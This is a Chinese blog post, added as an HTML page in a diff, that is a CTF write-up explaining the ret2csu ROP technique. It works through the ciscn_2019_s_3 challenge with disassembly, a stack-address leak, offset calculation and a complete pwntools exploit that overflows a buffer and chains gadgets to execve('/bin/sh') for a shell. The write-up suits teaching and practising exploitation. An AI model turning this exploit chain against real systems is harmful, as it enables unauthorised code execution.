@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"yw-by.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta property="og:type" content="article">
+<meta property="og:title" content="中级ROP之ret2_csu_init">
+<meta property="og:url" content="http://yw-by.github.io/yw/705232397/index.html">
+<meta property="og:site_name" content="yw__y">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/0.jpg">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/1.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/2.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/3.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/4.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/5.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/6.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/7.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/8.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/705232397/9.png">
+<meta property="article:published_time" content="2023-09-22T12:59:27.000Z">
+<meta property="article:modified_time" content="2023-09-24T11:34:23.993Z">
+<meta property="article:author" content="yw-by">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yw-by.github.io/yw/705232397/0.jpg">
+
+
+<link rel="canonical" href="http://yw-by.github.io/yw/705232397/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://yw-by.github.io/yw/705232397/","path":"yw/705232397/","title":"中级ROP之ret2_csu_init"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>中级ROP之ret2_csu_init | yw__y</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">yw__y</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#64%E4%BD%8D%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.</span> <span class="nav-text">64位的参数传递使用的寄存器顺序</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E5%85%AD%E4%B8%AA%E5%8F%82%E6%95%B0%E4%BD%BF%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E9%A1%BA%E5%BA%8F%E6%98%AF%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">前六个参数使用寄存器的顺序是：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D-libc-csu-init"><span class="nav-number">1.2.</span> <span class="nav-text">介绍_libc_csu_init</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-ciscn-2019-s-3"><span class="nav-number">1.3.</span> <span class="nav-text">例题 ciscn_2019_s_3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96"><span class="nav-number">1.3.1.</span> <span class="nav-text">查看保护和反汇编</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99binsh"><span class="nav-number">1.3.2.</span> <span class="nav-text">写binsh</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yw-by"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">yw-by</p>
+  <div class="site-description" itemprop="description">每天早起一点，或许我能赶上他们</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yw-by.github.io/yw/705232397/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="yw-by">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yw__y">
+      <meta itemprop="description" content="每天早起一点，或许我能赶上他们">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="中级ROP之ret2_csu_init | yw__y">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          中级ROP之ret2_csu_init
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-09-22 20:59:27" itemprop="dateCreated datePublished" datetime="2023-09-22T20:59:27+08:00">2023-09-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-24 19:34:23" itemprop="dateModified" datetime="2023-09-24T19:34:23+08:00">2023-09-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ROP/" itemprop="url" rel="index"><span itemprop="name">ROP</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ROP/%E4%B8%AD%E7%BA%A7ROP/" itemprop="url" rel="index"><span itemprop="name">中级ROP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><img src="/yw/705232397/0.jpg" class>
+
+<span id="more"></span>
+
+<h1 id="64位的参数传递使用的寄存器顺序"><a href="#64位的参数传递使用的寄存器顺序" class="headerlink" title="64位的参数传递使用的寄存器顺序"></a>64位的参数传递使用的寄存器顺序</h1><h2 id="前六个参数使用寄存器的顺序是："><a href="#前六个参数使用寄存器的顺序是：" class="headerlink" title="前六个参数使用寄存器的顺序是："></a>前六个参数使用寄存器的顺序是：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdi,rsi,rdx,rcs,r8,r9</span><br></pre></td></tr></table></figure>
+
+<p>之后的参数就是放入栈中了。</p>
+<p>例如参数大于七时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fun(a,b,c,d,e,f,g,h)//只是示范就不写参数类型了</span><br><span class="line">a-&gt;rdi,b-&gt;rsi,c-&gt;rdx,d-&gt;rcx,e-&gt;r8,f-&gt;r9</span><br><span class="line">h-&gt;esp</span><br><span class="line">g-&gt;esp</span><br><span class="line">call-&gt;fun</span><br></pre></td></tr></table></figure>
+
+<h2 id="介绍-libc-csu-init"><a href="#介绍-libc-csu-init" class="headerlink" title="介绍_libc_csu_init"></a>介绍_libc_csu_init</h2><p>在大多数情况下，我们很难找到每一个寄存器的gdgets，这时候就可以利用x64下的_libc_csu_init中的gedgets。<code>这个函数是用来对libc进行初始化的，一般的程序都会调用这个函数，所以这个函数一定会存在。</code></p>
+<p>比如例题的，长这样：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400580</span>                               loc_400580:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400580</span> <span class="number">4</span>C <span class="number">89</span> EA                      mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400583</span> <span class="number">4</span>C <span class="number">89</span> F6                      mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400586</span> <span class="number">44</span> <span class="number">89</span> FF                      mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400589</span> <span class="number">41</span> FF <span class="number">14</span> DC                   call    ds:(__frame_dummy_init_array_entry - <span class="number">600E10</span>h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000400589</span></span><br><span class="line">.text:<span class="number">000000000040058</span>D <span class="number">48</span> <span class="number">83</span> C3 <span class="number">01</span>                   add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400591</span> <span class="number">48</span> <span class="number">39</span> EB                      cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400594</span> <span class="number">75</span> EA                         jnz     <span class="type">short</span> loc_400580</span><br><span class="line">.text:<span class="number">0000000000400594</span></span><br><span class="line">.text:<span class="number">0000000000400596</span></span><br><span class="line">.text:<span class="number">0000000000400596</span>                               loc_400596:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400596</span> <span class="number">48</span> <span class="number">83</span> C4 <span class="number">08</span>                   add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040059</span>A <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000040059B</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000040059</span>C <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">000000000040059</span>E <span class="number">41</span> <span class="number">5</span>D                         pop     r13</span><br><span class="line">.text:<span class="number">00000000004005</span>A0 <span class="number">41</span> <span class="number">5</span>E                         pop     r14</span><br><span class="line">.text:<span class="number">00000000004005</span>A2 <span class="number">41</span> <span class="number">5F</span>                         pop     r15</span><br><span class="line">.text:<span class="number">00000000004005</span>A4 C3                            retn</span><br><span class="line">.text:<span class="number">00000000004005</span>A4                               ; &#125; <span class="comment">// starts at 400540</span></span><br><span class="line">.text:<span class="number">00000000004005</span>A4</span><br><span class="line">.text:<span class="number">00000000004005</span>A4                               __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>在<code>loc_400596:</code>里都是pop，在<code>loc_400580:</code>里再赋给其他我们需要的寄存器</p>
+<p>这里r15赋给edi处，是低32位，需要确认高位为0才可以用，不过我们有pop rdi这个gadget</p>
+<p>然后通过这些就可以系统调用**execve(‘&#x2F;bin&#x2F;sh’,0,0)**了</p>
+<h2 id="例题-ciscn-2019-s-3"><a href="#例题-ciscn-2019-s-3" class="headerlink" title="例题 ciscn_2019_s_3"></a>例题 ciscn_2019_s_3</h2><h3 id="查看保护和反汇编"><a href="#查看保护和反汇编" class="headerlink" title="查看保护和反汇编"></a>查看保护和反汇编</h3><p>checkesc</p>
+<img src="/yw/705232397/1.png" class>
+
+<p>64位，堆栈不可执行<br>ida<br>main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> vuln(argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vuln函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>汇编</p>
+<img src="/yw/705232397/2.png" class>
+
+<p>说一下汇编代码<br>xor rax, rax&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &gt; 将rax设置为0<br>mov edx, 400h&#x3D;&#x3D;&#x3D; &gt;将edx设置为0x400<br>lea rsi, [rsp+buf]&#x3D;&#x3D; &gt; 将buf参数的地址传入寄存器rsi<br>mov rdi, rax&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &gt;将rax寄存器里的值（0）传入rdi寄存器（将rdi设置为0）<br>syscall &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &gt;进行系统调用<br>这段是执行了 read（0，buf，0x400）<br>下面的write也是一样<br>两个函数都是通过系统调用的方式实现<br>对于amd64程序sys_read 的调用号 为 0 ；sys_write 的调用号 为 1；stub_execve 的调用号 为 59；</p>
+<p>buf只有0x10，read函数可以输入0x400，足以栈溢出<br>read之后有write，本题用它接收写入的&#x2F;bin&#x2F;sh地址<br>ida中有一个gadgets</p>
+<img src="/yw/705232397/3.png" class>
+
+<p>汇编</p>
+<img src="/yw/705232397/4.png" class>
+
+<p>可以看到有将rax设置为59的gadget<br>记下来execve&#x3D;0x4004E2 &#x2F;&#x2F;mov rax 59<br>接下来只要设置execve函数的参数，通过pop指令持续控制，让rdi&#x3D;&#x2F;bin&#x2F;sh，rsi&#x3D;0，rdx&#x3D;0即可获得shell<br>但是gadget中没有控制rdx的（通过ROPgadget指令查找）</p>
+<p>_libc_csu_init函数中的gadget</p>
+<img src="/yw/705232397/5.png" class>
+
+<p>这里有控制rdx的指令<br>先调用loc_400596的函数（从pop rbx处的地址开始）设置rbp为1，r12为&#x2F;bin&#x2F;sh地址加8（后面说），其他的都为0。<br>再调用loc_400580函数将上函数设置的值传到目标寄存器里。<br>让rbx为0，rbp为1目的是在后面跳出循环（但是做题时不跳也能通，还不明白为啥，即rbp也可以是0）<br>这么做的目的：在loc_400580里有一步call，它的调用地址是由r12和rbx决定的，rbx已经设置为0，我们可以设置r12为我们想要的地址）</p>
+<h3 id="写binsh"><a href="#写binsh" class="headerlink" title="写binsh"></a>写binsh</h3><p>本题没有&#x2F;bin&#x2F;sh，需要我们自己写。<br>write打印了0x30字节，会泄露一些栈上的地址<br>因为开启了保护，每次的站地址会不同，但是偏移是不会变的。<br>我们要找一个可以被write输出的地址，通过偏移来获得写入的&#x2F;bin&#x2F;sh地址<br>由vuln函数中的**lea rsi, [rsp+buf]**可知，rsi记录buf的地址<br>gdb调试（断点还是打在了nop处，输入了aaaa）</p>
+<img src="/yw/705232397/6.png" class>
+
+<p>这个是buf地址，查看该地址</p>
+<img src="/yw/705232397/7.png" class>
+
+<p>注意这三行，到上图标记的位置处就已经是0x28（40）了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdf40:	0x00007f0a61616161	0x0000000000400540# 前八位是aaaa</span><br><span class="line">0x7fffffffdf50:	0x00007fffffffdf70	0x0000000000400536 </span><br><span class="line">0x7fffffffdf60:	0x00007fffffffe068	0x0000000100000000</span><br></pre></td></tr></table></figure>
+
+<img src="/yw/705232397/8.png" class>
+
+<p>0x00007fffffffdf70是rbp栈底，0x00007fffffffe068这个地址比他高，处于栈中，所以他是栈中的一个地址（想到这，我觉得0x00007fffffffdf70应该也可以）</p>
+<img src="/yw/705232397/9.png" class>
+
+<p>0x0000000000400536是main函数的nop，还不知道为啥它会在这里<br>0x00007fffffffdf70之前由0x20个字节，在接收地址时要先把他们过滤掉。<br>再计算它到输入内容的偏移</p>
+<p>所以接收数据后减去0x128就是我们输入的位置<br>还需要syscall，在ida里就能找到，当然ROPgadget也可以<br>地址<strong>syscall&#x3D;0x400501</strong></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,26790)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">vuln_addr=<span class="number">0x4004ED</span></span><br><span class="line">execv=<span class="number">0x4004E2</span>  <span class="comment">#mov rax 59</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_addr=<span class="number">0x40059A</span></span><br><span class="line">mov_call_addr=<span class="number">0x400580</span></span><br><span class="line">syscall_addr=<span class="number">0x400501</span></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(pop_rdi_addr)+p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=u64(io.recv(<span class="number">8</span>))-<span class="number">0x128</span><span class="comment">#本地</span></span><br><span class="line"><span class="comment">#bin_sh_addr=u64(io.recv(8))-0x118#远程</span></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(pop_rdi_addr)+p64(pop_rbx_rbp_r12_r13_r14_r15_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(bin_sh_addr+<span class="number">0x8</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload2+=p64(mov_call_addr)+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(execv)+p64(syscall_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>注意上面的payload2，前面说将r12设置为我们想要执行的函数，我们将地址设置成了&#x2F;bin&#x2F;sh+8，而填充栈部分分别是&#x2F;bin&#x2F;sh和pop rdi，可能是我还没理解到位，遇到了一些目前无法理解的情况：&#x2F;bin&#x2F;sh后面接上其他pop一个寄存器的gadget都可以，直接把r12设置为pop rdi的地址不行。<br>另外，本地和远程计算出来的偏移量不同</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>yw-by
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://yw-by.github.io/yw/705232397/" title="中级ROP之ret2_csu_init">http://yw-by.github.io/yw/705232397/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/yw/3310350698/" rel="prev" title="stl源码剖析">
+                  <i class="fa fa-chevron-left"></i> stl源码剖析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/yw/3284650971/" rel="next" title="高级ROP-SROP">
+                  高级ROP-SROP <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yw-by</span>
+  </div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
